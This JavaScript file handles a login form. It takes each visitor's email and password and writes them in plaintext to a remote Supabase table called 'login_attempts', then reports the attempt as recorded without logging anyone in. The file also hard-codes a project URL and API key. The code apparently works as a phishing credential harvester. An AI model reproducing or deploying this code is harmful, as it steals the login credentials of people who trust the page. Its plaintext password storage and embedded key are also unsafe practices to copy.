// Replace with your Supabase project URL and anon/public key
const SUPABASE_URL = 'https://hdkirktmehxqnyfmcyzv.supabase.co/rest/v1/';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhka2lya3RtZWh4cW55Zm1jeXp2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwMzYxMzQsImV4cCI6MjEwMDYxMjEzNH0.5Vsg2123pba71O-2H2_ONB1EtPbJ_HY4X7UjbwSUGPQ';

// Initialize Supabase client
const { createClient } = supabase;
const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Save to Supabase table (e.g., "login_attempts")
  const { data, error } = await supabaseClient
    .from('login_attempts')
    .insert([{ email, password }]);

  if (error) {
    console.error('Error saving data:', error);
    alert('Failed to save login attempt.');
  } else {
    console.log('Login attempt saved:', data);
    alert('Login attempt recorded.');
  }
});